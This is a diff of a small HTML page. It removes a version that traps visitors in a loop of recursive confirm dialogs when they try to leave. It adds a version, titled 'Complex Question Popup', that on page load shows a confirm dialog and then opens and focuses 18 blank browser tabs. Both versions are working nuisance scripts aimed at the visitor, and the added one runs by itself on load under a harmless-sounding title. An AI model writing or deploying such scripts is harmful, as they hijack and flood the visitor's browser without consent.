@@ -3,86 +3,39 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Exit Prompt Site</title>
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        margin: 0;
-        background-color: #f0f0f0;
-    }
-    .prompt {
-        max-width: 80%;
-        padding: 20px;
-        background-color: #fff;
-        border-radius: 8px;
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        text-align: center;
-    }
-</style>
+<title>Complex Question Popup</title>
+<script>
+function askComplexQuestion() {
+    var question = "Please consider a very complex question here.";
+    var answer = confirm(question);
+
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+    openNewTab();
+}
+
+function openNewTab() {
+    var newTab = window.open("about:blank", "_blank");
+    newTab.focus();
+}
+</script>
 </head>
-<body>
-    <div class="prompt">
-        <h1>Are you sure you want to stay?</h1>
-        <p>Maybe it's time to leave...</p>
-        <button onclick="displayExitPrompt()">Stay Here</button>
-    </div>
-
-    <script>
-        // Array of unique exit prompts
-        var exitPrompts = [
-            "It looks like you've had enough. Ready to leave?",
-            "This site might not be what you're looking for. Are you sure you want to stay?",
-            "It's okay to move on. Shall we close this tab?",
-            "Maybe there's something more interesting elsewhere. Are you sure you want to stay?",
-            "You've been here for a while. How about closing this window?",
-            "There are many other sites out there. Are you sure this is where you want to be?",
-            "This site can be quite boring sometimes. Should we find something more exciting?",
-            "Staying here could be a waste of time. Ready to move on?",
-            "This site seems a bit dull. Are you sure you want to stick around?",
-            "You've seen enough here. Shall we explore elsewhere?",
-            "There's nothing new here. Ready to close this tab?",
-            "Are you sure you want to stay on this uneventful site?",
-            "This site may not have what you're looking for. Ready to leave?",
-            "Are you sure this is where you want to spend your time?",
-            "Maybe it's time to move on. Shall we close this window?",
-            "Staying here won't change anything. Ready to leave?",
-            "This site doesn't seem to interest you. Are you sure you want to stay?",
-            "You've explored this site enough. Shall we find something else?",
-            "Are you sure you want to stay on this page?",
-            "There's not much to see here. Ready to close this tab?",
-            "You've seen everything here. Are you sure you want to stay?",
-            "This site seems a bit outdated. Should we find something more modern?",
-            "Are you sure this is the best use of your time?",
-            "There's nothing left to explore here. Ready to leave?",
-            "This site might not have what you're looking for. Ready to move on?",
-            "You seem uninterested. Should we close this window?",
-            "Are you sure you want to stick around on this site?",
-            "It's okay to admit you're bored. Ready to leave?",
-            "This site may not have anything new to offer. Are you sure you want to stay?",
-            "Maybe it's time to find something more exciting. Ready to move on?",
-            "You've been here for a while. Should we close this tab?",
-            "Are you sure this is where you want to be?"
-        ];
-
-        // Function to display random exit prompt
-        function displayExitPrompt() {
-            var randomIndex = Math.floor(Math.random() * exitPrompts.length);
-            var promptMessage = exitPrompts[randomIndex];
-            if (confirm(promptMessage)) {
-                window.location.href = "about:blank";
-            } else {
-                displayExitPrompt();
-            }
-        }
-
-        // Call the function when the page unloads
-        window.onbeforeunload = function() {
-            displayExitPrompt();
-        };
-    </script>
+<body onload="askComplexQuestion()">
+<!-- This body onload event will trigger the function to ask the question on page load -->
 </body>
 </html>
